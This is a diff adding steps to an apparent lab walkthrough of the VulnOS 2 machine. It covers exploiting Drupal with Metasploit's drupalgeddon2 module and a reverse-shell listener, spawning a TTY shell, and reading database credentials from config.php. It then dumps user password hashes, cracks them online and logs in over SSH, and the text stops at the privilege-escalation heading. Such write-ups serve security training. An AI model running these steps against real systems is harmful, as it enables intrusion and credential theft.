@@ -49,3 +49,61 @@
     ![droopescan](./img/vulnos2_server6.png)  
         - `droopescan scan -u http://192.168.56.104/jabc/`  
         - The Drupal version: 7.22 ~ 7.26  
+
+## Execution  
+1. Find exploit  
+    * Use Metasploit  
+        - `msfconsole`  
+        - `search drupal 7 type:exploit`  
+        - `info exploit/unix/webapp/drupal_drupalgeddon2` (Confirmation of module #1)  
+        - `use exploit/unix/webapp/drupal_drupalgeddon2` (Use this exploit)  
+        - `set RHOSTS 192.168.56.104`  
+        - `set RPORT 80`  
+        - `set LHOST 192.168.56.101`  
+        - `set LPORT 4444`  
+        - `set TARGETURI /jabc/`  
+        - `run`  
+
+## Credential Access  
+1. Change shell  
+    * Get TTY shell  
+    ![TTY-shell](./img/vulnos2_server7.png)  
+        - `shell`  
+        - `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
+
+1. Get database information  
+    * Find credential information  
+    ![DB-info](./img/vulnos2_server8.png)  
+        - `cd ../jabcd0cs`  
+        - `cat config.php`  
+        - DB_NAME: "jabcd0cs"  
+        - DB_USER: "root"  
+        - DB_PASS: "toor"  
+
+1. Access to the database  
+    * Access to the MySQL server  
+        - `mysql -u root -p`  
+        - Password: "toor"  
+
+1. Get usernames and passwords  
+    * Search the database information  
+    ![MySQL-info](./img/vulnos2_server9.png)  
+        - `use jabcd0cs;`  
+        - `show tables;`  
+        - `describe odm_user;` 
+        - `select id,username,password from odm_user;`  
+
+1. Decode the password hashes  
+    * Use online MD5 hash cracker (https://crackcrypt.com/)  
+        - webmin: **webmin1980**  
+        - guest: **guest**  
+
+1. Access to the SSH service  
+    * Use the "webmin" credential  
+        - `ssh webmin@192.168.56.104`  
+        - Password: webmin1980  
+    * Change the shell  
+        - `/bin/bash -i`  
+
+## Privilege Escalation  
+1. 
